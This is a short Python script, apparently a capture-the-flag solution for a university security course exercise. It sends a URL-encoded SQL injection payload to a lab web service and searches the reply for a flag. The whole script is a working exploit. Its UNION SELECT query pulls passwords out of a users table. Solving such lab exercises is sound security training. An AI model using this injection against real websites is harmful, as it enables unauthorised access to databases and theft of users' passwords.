import requests
import re

URL = "https://t05-13ac6703ac35083a.itsec.sec.in.tum.de/?q="
QUERY = r'%27%20OR%20TRUE%20UNION%20SELECT%200,%20password,%20""%20FROM%20tumoogleplus_users--'

with requests.session() as sess:
   response = sess.get(URL+QUERY)
   match = re.search(r"flag?{[^}]+}", response.text)
   if match: print(match.group(0))
   else: print(response.text)